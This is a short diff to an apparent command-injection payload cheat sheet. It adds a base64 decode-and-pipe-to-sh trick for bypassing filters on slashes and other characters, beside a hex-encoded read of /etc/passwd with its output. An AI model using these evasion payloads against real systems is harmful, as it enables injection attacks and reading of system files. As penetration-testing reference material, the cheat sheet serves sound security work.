@@ -138,7 +138,12 @@ swissky@crashlab▸ ~ ▸ $ xxd -r -ps <(echo 2f6574632f706173737764)
 swissky@crashlab▸ ~ ▸ $ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
+### Bypass forward slash and characters with base64
+```
+echo 'bHMgLWwgLwo='| base64 -d | sh
+base64 -d <<< bHMgLWwgLwo= | sh
 
+```
 ### Bypass characters filter
 
 Commands execution without backslash and slash - linux bash
